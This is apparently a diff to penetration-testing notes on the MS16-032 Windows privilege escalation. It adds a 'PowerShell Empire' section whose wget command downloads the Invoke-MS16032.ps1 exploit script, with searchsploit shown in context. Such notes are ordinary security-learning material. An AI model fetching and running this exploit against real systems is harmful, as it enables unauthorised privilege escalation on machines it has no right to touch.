@@ -193,3 +193,9 @@ VulnStatus : Not Vulnerable
 ▶ searchsploit MS16-032
 ```
 ![image](https://user-images.githubusercontent.com/83878909/236182297-7f6de133-fd91-455a-b1f3-75d1261c90bf.png)
+
+### PowerShell Empire
+  - Download Exploit: `wget https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/privesc/Invoke-MS16032.ps1`
+```CSS
+▶ 
+```
